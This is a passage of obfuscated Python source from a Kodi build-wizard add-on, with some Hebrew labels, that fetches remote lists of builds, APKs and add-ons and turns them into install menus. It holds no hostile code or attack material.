	O0OOO0O0O0O0OO000 =(wiz .workingURL (O00O0OOOOO0OOO0OO ))#line:2192
	(O0OOO0O0O0O0OO000 )#line:2193
	O0OOO0O0O0O0OO000 =wiz .workingURL (SPEEDFILE )#line:2194
	if not O0OOO0O0O0O0OO000 ==True :#line:2195
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2196
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:2197
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2198
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:2199
		addFile ('%s'%O0OOO0O0O0O0OO000 ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2200
	else :#line:2201
		OO0O0OOO0000O0O00 ,OOO000OOOOO0000OO ,OOO0000O0O00O00O0 ,O0OO000000000O0O0 ,O0000O0OO0OO0O0OO ,OOO00O00000O00OO0 ,O0OO00000OOO0O0OO =wiz .buildCount ()#line:2202
		O000OO0O0O0OOO0O0 =False ;OOOO0OO0O00000000 =[]#line:2203
		if THIRDPARTY =='true':#line:2204
			if not THIRD1NAME ==''and not THIRD1URL =='':O000OO0O0O0OOO0O0 =True ;OOOO0OO0O00000000 .append ('1')#line:2205
			if not THIRD2NAME ==''and not THIRD2URL =='':O000OO0O0O0OOO0O0 =True ;OOOO0OO0O00000000 .append ('2')#line:2206
			if not THIRD3NAME ==''and not THIRD3URL =='':O000OO0O0O0OOO0O0 =True ;OOOO0OO0O00000000 .append ('3')#line:2207
		O0O000000O00O00O0 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:2208
		O0000000OO00OO0O0 =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0O000000O00O00O0 )#line:2209
		if OO0O0OOO0000O0O00 ==1 and O000OO0O0O0OOO0O0 ==False :#line:2210
			for OO0O0O0000OO00000 ,OOO00OOOO0O0O0O00 ,O000O00O00OO00000 ,O0O0000000000OO0O ,OO0OOO00OO000O000 ,O0O0O0OOO0O00OOO0 ,OO00OOO00O0O00O00 ,OOOO0OOOOOO0OO000 ,OO0O0OO0OO00OO0O0 ,OOO000OOOO0OOO0O0 in O0000000OO00OO0O0 :#line:2211
				if not SHOWADULT =='true'and OO0O0OO0OO00OO0O0 .lower ()=='yes':continue #line:2212
				if not DEVELOPER =='true'and wiz .strTest (OO0O0O0000OO00000 ):continue #line:2213
				viewBuild (O0000000OO00OO0O0 [0 ][0 ])#line:2214
				return #line:2215
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2218
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2219
		if O000OO0O0O0OOO0O0 ==True :#line:2220
			for O0OO00O0000O000O0 in OOOO0OO0O00000000 :#line:2221
				OO0O0O0000OO00000 =eval ('THIRD%sNAME'%O0OO00O0000O000O0 )#line:2222
		if len (O0000000OO00OO0O0 )>=1 :#line:2224
			if SEPERATE =='true':#line:2225
				for OO0O0O0000OO00000 ,OOO00OOOO0O0O0O00 ,O000O00O00OO00000 ,O0O0000000000OO0O ,OO0OOO00OO000O000 ,O0O0O0OOO0O00OOO0 ,OO00OOO00O0O00O00 ,OOOO0OOOOOO0OO000 ,OO0O0OO0OO00OO0O0 ,OOO000OOOO0OOO0O0 in O0000000OO00OO0O0 :#line:2226
					if not SHOWADULT =='true'and OO0O0OO0OO00OO0O0 .lower ()=='yes':continue #line:2227
					if not DEVELOPER =='true'and wiz .strTest (OO0O0O0000OO00000 ):continue #line:2228
					OO00O0OOOO0O0O000 =createMenu ('install','',OO0O0O0000OO00000 )#line:2229
					addDir ('[%s] %s (v%s)'%(float (OO0OOO00OO000O000 ),OO0O0O0000OO00000 ,OOO00OOOO0O0O0O00 ),'viewbuild',OO0O0O0000OO00000 ,description =OOO000OOOO0OOO0O0 ,fanart =OOOO0OOOOOO0OO000 ,icon =OO00OOO00O0O00O00 ,menu =OO00O0OOOO0O0O000 ,themeit =THEME2 )#line:2230
			else :#line:2231
				if O0OO000000000O0O0 >0 :#line:2232
					OOO0OO0OO0O0O000O ='+'if SHOW17 =='false'else '-'#line:2233
					if SHOW17 =='true':#line:2235
						for OO0O0O0000OO00000 ,OOO00OOOO0O0O0O00 ,O000O00O00OO00000 ,O0O0000000000OO0O ,OO0OOO00OO000O000 ,O0O0O0OOO0O00OOO0 ,OO00OOO00O0O00O00 ,OOOO0OOOOOO0OO000 ,OO0O0OO0OO00OO0O0 ,OOO000OOOO0OOO0O0 in O0000000OO00OO0O0 :#line:2237
							if not SHOWADULT =='true'and OO0O0OO0OO00OO0O0 .lower ()=='yes':continue #line:2238
							if not DEVELOPER =='true'and wiz .strTest (OO0O0O0000OO00000 ):continue #line:2239
							OOO0O0O00OO0O00OO =int (float (OO0OOO00OO000O000 ))#line:2240
							if OOO0O0O00OO0O00OO ==17 :#line:2241
								OO00O0OOOO0O0O000 =createMenu ('install','',OO0O0O0000OO00000 )#line:2242
								addDir ('[%s] %s (v%s)'%(float (OO0OOO00OO000O000 ),OO0O0O0000OO00000 ,OOO00OOOO0O0O0O00 ),'viewbuild',OO0O0O0000OO00000 ,description =OOO000OOOO0OOO0O0 ,fanart =OOOO0OOOOOO0OO000 ,icon =OO00OOO00O0O00O00 ,menu =OO00O0OOOO0O0O000 ,themeit =THEME2 )#line:2243
				if O0000O0OO0OO0O0OO >0 :#line:2244
					OOO0OO0OO0O0O000O ='+'if SHOW18 =='false'else '-'#line:2245
					if SHOW18 =='true':#line:2247
						for OO0O0O0000OO00000 ,OOO00OOOO0O0O0O00 ,O000O00O00OO00000 ,O0O0000000000OO0O ,OO0OOO00OO000O000 ,O0O0O0OOO0O00OOO0 ,OO00OOO00O0O00O00 ,OOOO0OOOOOO0OO000 ,OO0O0OO0OO00OO0O0 ,OOO000OOOO0OOO0O0 in O0000000OO00OO0O0 :#line:2249
							if not SHOWADULT =='true'and OO0O0OO0OO00OO0O0 .lower ()=='yes':continue #line:2250
							if not DEVELOPER =='true'and wiz .strTest (OO0O0O0000OO00000 ):continue #line:2251
							OOO0O0O00OO0O00OO =int (float (OO0OOO00OO000O000 ))#line:2252
							if OOO0O0O00OO0O00OO ==18 :#line:2253
								OO00O0OOOO0O0O000 =createMenu ('install','',OO0O0O0000OO00000 )#line:2254
								addDir ('[%s] %s (v%s)'%(float (OO0OOO00OO000O000 ),OO0O0O0000OO00000 ,OOO00OOOO0O0O0O00 ),'viewbuild',OO0O0O0000OO00000 ,description =OOO000OOOO0OOO0O0 ,fanart =OOOO0OOOOOO0OO000 ,icon =OO00OOO00O0O00O00 ,menu =OO00O0OOOO0O0O000 ,themeit =THEME2 )#line:2255
				if OOO0000O0O00O00O0 >0 :#line:2256
					OOO0OO0OO0O0O000O ='+'if SHOW16 =='false'else '-'#line:2257
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(OOO0OO0OO0O0O000O ,OOO0000O0O00O00O0 ),'togglesetting','show16',themeit =THEME3 )#line:2258
					if SHOW16 =='true':#line:2259
						for OO0O0O0000OO00000 ,OOO00OOOO0O0O0O00 ,O000O00O00OO00000 ,O0O0000000000OO0O ,OO0OOO00OO000O000 ,O0O0O0OOO0O00OOO0 ,OO00OOO00O0O00O00 ,OOOO0OOOOOO0OO000 ,OO0O0OO0OO00OO0O0 ,OOO000OOOO0OOO0O0 in O0000000OO00OO0O0 :#line:2260
							if not SHOWADULT =='true'and OO0O0OO0OO00OO0O0 .lower ()=='yes':continue #line:2261
							if not DEVELOPER =='true'and wiz .strTest (OO0O0O0000OO00000 ):continue #line:2262
							OOO0O0O00OO0O00OO =int (float (OO0OOO00OO000O000 ))#line:2263
							if OOO0O0O00OO0O00OO ==16 :#line:2264
								OO00O0OOOO0O0O000 =createMenu ('install','',OO0O0O0000OO00000 )#line:2265
								addDir ('[%s] %s (v%s)'%(float (OO0OOO00OO000O000 ),OO0O0O0000OO00000 ,OOO00OOOO0O0O0O00 ),'viewbuild',OO0O0O0000OO00000 ,description =OOO000OOOO0OOO0O0 ,fanart =OOOO0OOOOOO0OO000 ,icon =OO00OOO00O0O00O00 ,menu =OO00O0OOOO0O0O000 ,themeit =THEME2 )#line:2266
				if OOO000OOOOO0000OO >0 :#line:2267
					OOO0OO0OO0O0O000O ='+'if SHOW15 =='false'else '-'#line:2268
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(OOO0OO0OO0O0O000O ,OOO000OOOOO0000OO ),'togglesetting','show15',themeit =THEME3 )#line:2269
					if SHOW15 =='true':#line:2270
						for OO0O0O0000OO00000 ,OOO00OOOO0O0O0O00 ,O000O00O00OO00000 ,O0O0000000000OO0O ,OO0OOO00OO000O000 ,O0O0O0OOO0O00OOO0 ,OO00OOO00O0O00O00 ,OOOO0OOOOOO0OO000 ,OO0O0OO0OO00OO0O0 ,OOO000OOOO0OOO0O0 in O0000000OO00OO0O0 :#line:2271
							if not SHOWADULT =='true'and OO0O0OO0OO00OO0O0 .lower ()=='yes':continue #line:2272
							if not DEVELOPER =='true'and wiz .strTest (OO0O0O0000OO00000 ):continue #line:2273
							OOO0O0O00OO0O00OO =int (float (OO0OOO00OO000O000 ))#line:2274
							if OOO0O0O00OO0O00OO <=15 :#line:2275
								OO00O0OOOO0O0O000 =createMenu ('install','',OO0O0O0000OO00000 )#line:2276
								addDir ('[%s] %s (v%s)'%(float (OO0OOO00OO000O000 ),OO0O0O0000OO00000 ,OOO00OOOO0O0O0O00 ),'viewbuild',OO0O0O0000OO00000 ,description =OOO000OOOO0OOO0O0 ,fanart =OOOO0OOOOOO0OO000 ,icon =OO00OOO00O0O00O00 ,menu =OO00O0OOOO0O0O000 ,themeit =THEME2 )#line:2277
		elif O0OO00000OOO0O0OO >0 :#line:2278
			if OOO00O00000O00OO0 >0 :#line:2279
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2280
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2281
			else :#line:2282
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2283
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2284
	setView ('files','viewType')#line:2285
def viewBuild (O00O0OO0O00OO0OO0 ):#line:2287
	OOO0000OO00000OOO =wiz .workingURL (SPEEDFILE )#line:2288
	if not OOO0000OO00000OOO ==True :#line:2289
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2290
		addFile ('%s'%OOO0000OO00000OOO ,'',themeit =THEME3 )#line:2291
		return #line:2292
	if wiz .checkBuild (O00O0OO0O00OO0OO0 ,'version')==False :#line:2293
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2294
		addFile ('%s was not found in the builds list.'%O00O0OO0O00OO0OO0 ,'',themeit =THEME3 )#line:2295
		return #line:2296
	OOOOO0OOO0O0OO0O0 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2297
	O00OOOO0O0000OO00 =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O00O0OO0O00OO0OO0 ).findall (OOOOO0OOO0O0OO0O0 )#line:2298
	for O0000O00O0O00O0OO ,O0OOO0000OOOOOO0O ,O00OO00O00O0O0000 ,OO0O000OO0OOO0OOO ,OO00O0OOO0OOOO000 ,OO0O00000O000OOOO ,OO0O000O0OOOOOO0O ,OOOOOO0000O000OOO ,O00O0O000O0O00OO0 ,O00OO0O00O000000O in O00OOOO0O0000OO00 :#line:2299
		OO0O00000O000OOOO =OO0O00000O000OOOO if wiz .workingURL (OO0O00000O000OOOO )else ICON #line:2300
		OO0O000O0OOOOOO0O =OO0O000O0OOOOOO0O if wiz .workingURL (OO0O000O0OOOOOO0O )else FANART #line:2301
		O00OOO0O0OO00OOO0 ='%s (v%s)'%(O00O0OO0O00OO0OO0 ,O0000O00O0O00O0OO )#line:2302
		if BUILDNAME ==O00O0OO0O00OO0OO0 and O0000O00O0O00O0OO >BUILDVERSION :#line:2303
			O00OOO0O0OO00OOO0 ='%s [COLOR red][CURRENT v%s][/COLOR]'%(O00OOO0O0OO00OOO0 ,BUILDVERSION )#line:2304
		O0O00O0O0OOOOOO0O =int (float (KODIV ));OO00OO0O0O00OOOOO =int (float (OO0O000OO0OOO0OOO ))#line:2313
		if not O0O00O0O0OOOOOO0O ==OO00OO0O0O00OOOOO :#line:2314
			if O0O00O0O0OOOOOO0O ==16 and OO00OO0O0O00OOOOO <=15 :OO0OO000O0OO0OOOO =False #line:2315
			else :OO0OO000O0OO0OOOO =True #line:2316
		else :OO0OO000O0OO0OOOO =False #line:2317
		addFile ('התקנה','install',O00O0OO0O00OO0OO0 ,'fresh',description =O00OO0O00O000000O ,fanart =OO0O000O0OOOOOO0O ,icon =OO0O00000O000OOOO ,themeit =THEME1 )#line:2321
		if not OO00O0OOO0OOOO000 =='http://':#line:2324
			if wiz .workingURL (OO00O0OOO0OOOO000 )==True :#line:2325
				addFile (wiz .sep ('THEMES'),'',fanart =OO0O000O0OOOOOO0O ,icon =OO0O00000O000OOOO ,themeit =THEME3 )#line:2326
				OOOOO0OOO0O0OO0O0 =wiz .openURL (OO00O0OOO0OOOO000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2327
				O00OOOO0O0000OO00 =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOOOO0OOO0O0OO0O0 )#line:2328
				for O0OOO00OO000O0OO0 ,OO00O0O00O0OOO000 ,O0O00O000O0O0000O ,O0O0OOOOOO0000000 ,O00OOO0OOOOOOO000 ,O00OO0O00O000000O in O00OOOO0O0000OO00 :#line:2329
					if not SHOWADULT =='true'and O00OOO0OOOOOOO000 .lower ()=='yes':continue #line:2330
					O0O00O000O0O0000O =O0O00O000O0O0000O if O0O00O000O0O0000O =='http://'else OO0O00000O000OOOO #line:2331
					O0O0OOOOOO0000000 =O0O0OOOOOO0000000 if O0O0OOOOOO0000000 =='http://'else OO0O000O0OOOOOO0O #line:2332
					addFile (O0OOO00OO000O0OO0 if not O0OOO00OO000O0OO0 ==BUILDTHEME else "[B]%s (Installed)[/B]"%O0OOO00OO000O0OO0 ,'theme',O00O0OO0O00OO0OO0 ,O0OOO00OO000O0OO0 ,description =O00OO0O00O000000O ,fanart =O0O0OOOOOO0000000 ,icon =O0O00O000O0O0000O ,themeit =THEME3 )#line:2333
	setView ('files','viewType')#line:2334
def viewThirdList (OOOO00OOOO0OO00OO ):#line:2336
	O00OOO000OOO0OOO0 =eval ('THIRD%sNAME'%OOOO00OOOO0OO00OO )#line:2337
	O00OOO00000O0O0O0 =eval ('THIRD%sURL'%OOOO00OOOO0OO00OO )#line:2338
	OO00OOO00OO00OOOO =wiz .workingURL (O00OOO00000O0O0O0 )#line:2339
	if not OO00OOO00OO00OOOO ==True :#line:2340
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2341
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2342
	else :#line:2343
		O0OOOO00O0O0O000O ,O0O0O0OO0OO0O0OOO =wiz .thirdParty (O00OOO00000O0O0O0 )#line:2344
		addFile ("[B]%s[/B]"%O00OOO000OOO0OOO0 ,'',themeit =THEME3 )#line:2345
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2346
		if O0OOOO00O0O0O000O :#line:2347
			for O00OOO000OOO0OOO0 ,O00O00O0OOO0O0O0O ,O00OOO00000O0O0O0 ,O0000OO000000OO0O ,OO0O000OO0OOOOOO0 ,OO0OOO0O00OOOOO00 ,O0000O00O00O00O0O ,OO0O0O0OOO00000OO in O0O0O0OO0OO0O0OOO :#line:2348
				if not SHOWADULT =='true'and O0000O00O00O00O0O .lower ()=='yes':continue #line:2349
				addFile ("[%s] %s v%s"%(O0000OO000000OO0O ,O00OOO000OOO0OOO0 ,O00O00O0OOO0O0O0O ),'installthird',O00OOO000OOO0OOO0 ,O00OOO00000O0O0O0 ,icon =OO0O000OO0OOOOOO0 ,fanart =OO0OOO0O00OOOOO00 ,description =OO0O0O0OOO00000OO ,themeit =THEME2 )#line:2350
		else :#line:2351
			for O00OOO000OOO0OOO0 ,O00OOO00000O0O0O0 ,OO0O000OO0OOOOOO0 ,OO0OOO0O00OOOOO00 ,OO0O0O0OOO00000OO in O0O0O0OO0OO0O0OOO :#line:2352
				addFile (O00OOO000OOO0OOO0 ,'installthird',O00OOO000OOO0OOO0 ,O00OOO00000O0O0O0 ,icon =OO0O000OO0OOOOOO0 ,fanart =OO0OOO0O00OOOOO00 ,description =OO0O0O0OOO00000OO ,themeit =THEME2 )#line:2353
def editThirdParty (O0OOOOO0000000000 ):#line:2355
	O000000O0O00O00OO =eval ('THIRD%sNAME'%O0OOOOO0000000000 )#line:2356
	O0O0O0OO0O00000OO =eval ('THIRD%sURL'%O0OOOOO0000000000 )#line:2357
	OOOO0O00000OO00O0 =wiz .getKeyboard (O000000O0O00O00OO ,'Enter the Name of the Wizard')#line:2358
	O00OOOO0OO000000O =wiz .getKeyboard (O0O0O0OO0O00000OO ,'Enter the URL of the Wizard Text')#line:2359
	wiz .setS ('wizard%sname'%O0OOOOO0000000000 ,OOOO0O00000OO00O0 )#line:2361
	wiz .setS ('wizard%surl'%O0OOOOO0000000000 ,O00OOOO0OO000000O )#line:2362
def apkScraper (name =""):#line:2364
	if name =='kodi':#line:2365
		O00O0OO000OO00OOO ='http://mirrors.kodi.tv/releases/android/arm/'#line:2366
		O0OO00OO0O0O0O00O ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2367
		O0O0O000OOOO00OO0 =wiz .openURL (O00O0OO000OO00OOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2368
		O0000OOOOO00O0OO0 =wiz .openURL (O0OO00OO0O0O0O00O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2369
		OOOOOOOOOO00OOO0O =0 #line:2370
		OOO0OO0O0OO0OO000 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O0O0O000OOOO00OO0 )#line:2371
		O0O0OO0O0OOO00O00 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O0000OOOOO00O0OO0 )#line:2372
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2374
		OO000O0OOO0000000 =False #line:2375
		for OO0000O000000OO00 ,name ,OOOOOOO00OO00OOOO ,OO0OOO0OOO0O0OO0O in OOO0OO0O0OO0OO000 :#line:2376
			if OO0000O000000OO00 in ['../','old/']:continue #line:2377
			if not OO0000O000000OO00 .endswith ('.apk'):continue #line:2378
			if not OO0000O000000OO00 .find ('_')==-1 and OO000O0OOO0000000 ==True :continue #line:2379
			try :#line:2380
				OOO0OO0O000OOOOO0 =name .split ('-')#line:2381
				if not OO0000O000000OO00 .find ('_')==-1 :#line:2382
					OO000O0OOO0000000 =True #line:2383
					O0OOO00O00O0O00O0 ,O0O0O0O00O0000O0O =OOO0OO0O000OOOOO0 [2 ].split ('_')#line:2384
				else :#line:2385
					O0OOO00O00O0O00O0 =OOO0OO0O000OOOOO0 [2 ]#line:2386
					O0O0O0O00O0000O0O =''#line:2387
				O0O00OOO0OO00O000 ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0OO0O000OOOOO0 [0 ].title (),OOO0OO0O000OOOOO0 [1 ],O0O0O0O00O0000O0O .upper (),O0OOO00O00O0O00O0 ,COLOR2 ,OOOOOOO00OO00OOOO .replace (' ',''),COLOR1 ,OO0OOO0OOO0O0OO0O )#line:2388
				OOO00OOOO000O00O0 =urljoin (O00O0OO000OO00OOO ,OO0000O000000OO00 )#line:2389
				addFile (O0O00OOO0OO00O000 ,'apkinstall',"%s v%s%s %s"%(OOO0OO0O000OOOOO0 [0 ].title (),OOO0OO0O000OOOOO0 [1 ],O0O0O0O00O0000O0O .upper (),O0OOO00O00O0O00O0 ),OOO00OOOO000O00O0 )#line:2390
				OOOOOOOOOO00OOO0O +=1 #line:2391
			except :#line:2392
				wiz .log ("Error on: %s"%name )#line:2393
		for OO0000O000000OO00 ,name ,OOOOOOO00OO00OOOO ,OO0OOO0OOO0O0OO0O in O0O0OO0O0OOO00O00 :#line:2395
			if OO0000O000000OO00 in ['../','old/']:continue #line:2396
			if not OO0000O000000OO00 .endswith ('.apk'):continue #line:2397
			if not OO0000O000000OO00 .find ('_')==-1 :continue #line:2398
			try :#line:2399
				OOO0OO0O000OOOOO0 =name .split ('-')#line:2400
				O0O00OOO0OO00O000 ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0OO0O000OOOOO0 [0 ].title (),OOO0OO0O000OOOOO0 [1 ],OOO0OO0O000OOOOO0 [2 ],COLOR2 ,OOOOOOO00OO00OOOO .replace (' ',''),COLOR1 ,OO0OOO0OOO0O0OO0O )#line:2401
				OOO00OOOO000O00O0 =urljoin (O0OO00OO0O0O0O00O ,OO0000O000000OO00 )#line:2402
				addFile (O0O00OOO0OO00O000 ,'apkinstall',"%s v%s %s"%(OOO0OO0O000OOOOO0 [0 ].title (),OOO0OO0O000OOOOO0 [1 ],OOO0OO0O000OOOOO0 [2 ]),OOO00OOOO000O00O0 )#line:2403
				OOOOOOOOOO00OOO0O +=1 #line:2404
			except :#line:2405
				wiz .log ("Error on: %s"%name )#line:2406
		if OOOOOOOOOO00OOO0O ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2407
	elif name =='spmc':#line:2408
		OOOOO0OO00O0O00O0 ='https://github.com/koying/SPMC/releases'#line:2409
		O0O0O000OOOO00OO0 =wiz .openURL (OOOOO0OO00O0O00O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2410
		OOOOOOOOOO00OOO0O =0 #line:2411
		OOO0OO0O0OO0OO000 =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (O0O0O000OOOO00OO0 )#line:2412
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2414
		for name ,O0O00OOO000000O0O in OOO0OO0O0OO0OO000 :#line:2416
			O0O00OO00000OO0OO =''#line:2417
			O0O0OO0O0OOO00O00 =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (O0O00OOO000000O0O )#line:2418
			for O0O000O0OOOO00O0O ,O0000OOO0OO00OOO0 ,O0OO0O0O00OOOOOO0 in O0O0OO0O0OOO00O00 :#line:2419
				if O0OO0O0O00OOOOOO0 .find ('armeabi')==-1 :continue #line:2420
				if O0OO0O0O00OOOOOO0 .find ('launcher')>-1 :continue #line:2421
				O0O00OO00000OO0OO =urljoin ('https://github.com',O0O000O0OOOO00O0O )#line:2422
				break #line:2423
		if OOOOOOOOOO00OOO0O ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2425
def apkMenu (url =None ):#line:2427
	if url ==None :#line:2428
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2431
	if not APKFILE =='http://':#line:2432
		if url ==None :#line:2433
			O0O000O0000O00O0O =wiz .workingURL (APKFILE )#line:2434
			OOOOOOOOOO0OO00O0 =uservar .APKFILE #line:2435
		else :#line:2436
			O0O000O0000O00O0O =wiz .workingURL (url )#line:2437
			OOOOOOOOOO0OO00O0 =url #line:2438
		if O0O000O0000O00O0O ==True :#line:2439
			O0000OO0OO0OOOO0O =wiz .openURL (OOOOOOOOOO0OO00O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2440
			OOOOOOO00O0O00OOO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0000OO0OO0OOOO0O )#line:2441
			if len (OOOOOOO00O0O00OOO )>0 :#line:2442
				OOO00O00OOO0O0000 =0 #line:2443
				for O0O0OO0O00O0OOO00 ,O0OOO00O0O000OO0O ,url ,OOO00O0OO000O00OO ,O0OOOOO0O00O0000O ,OO0OOO0OO00OO000O ,O0O000O00O000O00O in OOOOOOO00O0O00OOO :#line:2444
					if not SHOWADULT =='true'and OO0OOO0OO00OO000O .lower ()=='yes':continue #line:2445
					if O0OOO00O0O000OO0O .lower ()=='yes':#line:2446
						OOO00O00OOO0O0000 +=1 #line:2447
						addDir ("[B]%s[/B]"%O0O0OO0O00O0OOO00 ,'apk',url ,description =O0O000O00O000O00O ,icon =OOO00O0OO000O00OO ,fanart =O0OOOOO0O00O0000O ,themeit =THEME3 )#line:2448
					else :#line:2449
						OOO00O00OOO0O0000 +=1 #line:2450
						addFile (O0O0OO0O00O0OOO00 ,'apkinstall',O0O0OO0O00O0OOO00 ,url ,description =O0O000O00O000O00O ,icon =OOO00O0OO000O00OO ,fanart =O0OOOOO0O00O0000O ,themeit =THEME2 )#line:2451
					if OOO00O00OOO0O0000 <1 :#line:2452
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2453
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2454
		else :#line:2455
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2456
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2457
			addFile ('%s'%O0O000O0000O00O0O ,'',themeit =THEME3 )#line:2458
		return #line:2459
	else :wiz .log ("[APK Menu] No APK list added.")#line:2460
	setView ('files','viewType')#line:2461
def addonMenu (url =None ):#line:2463
	if not ADDONFILE =='http://':#line:2464
		if url ==None :#line:2465
			O0OO0O0O0OO0O000O =wiz .workingURL (ADDONFILE )#line:2466
			O0OO0OOO0OOOOOO00 =uservar .ADDONFILE #line:2467
		else :#line:2468
			O0OO0O0O0OO0O000O =wiz .workingURL (url )#line:2469
			O0OO0OOO0OOOOOO00 =url #line:2470
		if O0OO0O0O0OO0O000O ==True :#line:2471
			O00O0O000OOO00O0O =wiz .openURL (O0OO0OOO0OOOOOO00 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2472
			O00000O0OO000O000 =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O00O0O000OOO00O0O )#line:2473
			if len (O00000O0OO000O000 )>0 :#line:2474
				O0O00OO0000000O00 =0 #line:2475
				for O0000O0OO0O000O00 ,O00O0O0OOOO00O0OO ,url ,O00000O0O0O000OOO ,OOOO00OOOO0O00O0O ,OO0OO00000OO00000 ,O0O0OOOO00O0OO0O0 ,OO0OOO00O000OO000 ,OOOOOOO00OO0O00OO ,OOOOOOOO000O00O0O in O00000O0OO000O000 :#line:2476
					if O00O0O0OOOO00O0OO .lower ()=='section':#line:2477
						O0O00OO0000000O00 +=1 #line:2478
						addDir ("[B]%s[/B]"%O0000O0OO0O000O00 ,'addons',url ,description =OOOOOOOO000O00O0O ,icon =O0O0OOOO00O0OO0O0 ,fanart =OO0OOO00O000OO000 ,themeit =THEME3 )#line:2479
					else :#line:2480
						if not SHOWADULT =='true'and OOOOOOO00OO0O00OO .lower ()=='yes':continue #line:2481
						try :#line:2482
							OOOO0OO000000OO0O =xbmcaddon .Addon (id =O00O0O0OOOO00O0OO ).getAddonInfo ('path')#line:2483
							if os .path .exists (OOOO0OO000000OO0O ):#line:2484
								O0000O0OO0O000O00 ="[COLOR green][Installed][/COLOR] %s"%O0000O0OO0O000O00 #line:2485
						except :#line:2486
							pass #line:2487
						O0O00OO0000000O00 +=1 #line:2488
						addFile (O0000O0OO0O000O00 ,'addoninstall',O00O0O0OOOO00O0OO ,O0OO0OOO0OOOOOO00 ,description =OOOOOOOO000O00O0O ,icon =O0O0OOOO00O0OO0O0 ,fanart =OO0OOO00O000OO000 ,themeit =THEME2 )#line:2489
					if O0O00OO0000000O00 <1 :#line:2490
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2491
			else :#line:2492
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2493
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2494
		else :#line:2495
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2496
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2497
			addFile ('%s'%O0OO0O0O0OO0O000O ,'',themeit =THEME3 )#line:2498
